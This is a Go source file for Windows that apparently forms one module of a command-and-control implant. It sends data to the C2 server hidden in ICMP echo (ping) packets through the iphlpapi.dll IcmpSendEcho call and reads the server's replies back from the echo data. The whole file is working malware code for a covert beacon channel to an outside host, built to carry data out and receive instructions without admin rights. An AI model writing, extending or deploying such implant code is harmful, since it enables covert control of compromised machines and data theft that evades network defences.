//go:build windows
// +build windows

package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"syscall"
	"time"
	"unsafe"
)

// Windows ICMP via IcmpSendEcho2 (iphlpapi.dll) — no admin required for sending.
var (
	iphlpapi            = syscall.NewLazyDLL("iphlpapi.dll")
	procIcmpCreateFile  = iphlpapi.NewProc("IcmpCreateFile")
	procIcmpSendEcho    = iphlpapi.NewProc("IcmpSendEcho")
	procIcmpCloseHandle = iphlpapi.NewProc("IcmpCloseHandle")
)

type icmpEchoReply struct {
	Address       [4]byte
	Status        uint32
	RoundTripTime uint32
	DataSize      uint16
	Reserved      uint16
	Data          unsafe.Pointer
	Options       [8]byte
}

func sendICMPBeacon(body []byte) []byte {
	if C2URL == "" {
		return nil
	}
	hostPort, _, ok := currentC2Dial()
	if !ok {
		return nil
	}
	host := hostnameFromHostPort(hostPort)

	ips, err := net.LookupIP(host)
	if err != nil || len(ips) == 0 {
		return nil
	}
	var ip4 net.IP
	for _, ip := range ips {
		if ip4 = ip.To4(); ip4 != nil {
			break
		}
	}
	if ip4 == nil {
		return nil
	}
	var addr [4]byte
	copy(addr[:], ip4[:4])

	h, _, _ := procIcmpCreateFile.Call()
	if h == 0 || h == ^uintptr(0) {
		return nil
	}
	defer procIcmpCloseHandle.Call(h)

	dest := binary.LittleEndian.Uint32(addr[:])
	return sendICMPBeaconFramed(body, func(payload []byte, seq int) []byte {
		return icmpWindowsEcho(h, dest, addr, payload)
	})
}

func icmpWindowsEcho(h uintptr, dest uint32, addr [4]byte, payload []byte) []byte {
	if len(payload) == 0 {
		return nil
	}
	replyBuf := make([]byte, 64+len(payload)+256)
	ret, _, _ := procIcmpSendEcho.Call(
		h,
		uintptr(dest),
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		0,
		0,
		uintptr(unsafe.Pointer(&replyBuf[0])),
		uintptr(len(replyBuf)),
		5000,
	)
	if ret == 0 {
		return nil
	}
	if len(replyBuf) < 8 {
		return nil
	}
	status := binary.LittleEndian.Uint32(replyBuf[4:8])
	if status != 0 {
		return nil
	}
	if replyBuf[0] != addr[0] || replyBuf[1] != addr[1] || replyBuf[2] != addr[2] || replyBuf[3] != addr[3] {
		return nil
	}
	var reply icmpEchoReply
	dataOffset := int(unsafe.Sizeof(reply))
	if dataOffset >= len(replyBuf) {
		return nil
	}
	dataSize := int(binary.LittleEndian.Uint16(replyBuf[12:14]))
	if dataSize == 0 || dataOffset+dataSize > len(replyBuf) {
		return nil
	}
	result := make([]byte, dataSize)
	copy(result, replyBuf[dataOffset:dataOffset+dataSize])
	return result
}

var _ = time.Second
var _ = fmt.Sprintf
